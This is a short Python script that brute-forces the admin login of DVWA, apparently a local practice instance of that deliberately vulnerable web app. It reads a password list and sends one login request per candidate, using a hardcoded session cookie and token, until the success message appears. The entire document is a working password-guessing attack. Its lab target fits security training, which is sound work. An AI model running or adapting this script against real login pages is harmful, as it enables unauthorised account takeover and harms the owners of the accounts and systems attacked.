import requests

if __name__ == '__main__':
    list_passwords = []
    with open("passwords.txt", "r") as file:
        for readline in file:
            line_strip = readline.strip()
            list_passwords.append(line_strip)

    cookies = {'security': 'low', 'PHPSESSID': 'k5jj4o3iha1mpgd8kaubphpioo'}
    for password in list_passwords:
        request = requests.get(
            f'http://192.168.0.138/dvwa/vulnerabilities/brute/?username=admin&password={password}&user_token=e3fb80701377a93c66ca8e9d13667dac&Login=Login#',
            auth=('admin', 'password'), verify=False, cookies=cookies)
        if "Welcome to the password protected area admin" in request.text:
            print(f"Login = admin, Correct password = {password}")
            break
